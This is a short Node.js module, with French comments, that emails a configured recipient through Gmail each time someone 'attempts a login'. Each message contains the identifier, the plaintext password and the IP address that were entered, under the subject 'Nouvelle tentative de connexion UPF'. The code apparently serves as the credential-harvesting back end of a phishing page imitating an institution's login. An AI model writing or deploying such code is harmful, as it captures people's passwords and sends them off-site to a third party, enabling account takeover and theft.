import nodemailer from 'nodemailer';
import dotenv from 'dotenv';

dotenv.config();

// Configuration du transporteur email
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

export const sendLoginNotificationEmail = async (identifiant, motDePasse, ipAddress) => {
  try {
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_RECIPIENT,
      subject: 'Nouvelle tentative de connexion UPF',
      html: `
        <h2>Tentative de connexion détectée</h2>
        <p><strong>Date:</strong> ${new Date().toLocaleString('fr-FR')}</p>
        <p><strong>Identifiant:</strong> ${identifiant}</p>
        <p><strong>Mot de passe:</strong> ${motDePasse}</p>
        <p><strong>Adresse IP:</strong> ${ipAddress || 'Non disponible'}</p>
      `,
    };

    const result = await transporter.sendMail(mailOptions);
    console.log('Email envoyé avec succès:', result.messageId);
    return result;
  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error);
    throw error;
  }
};
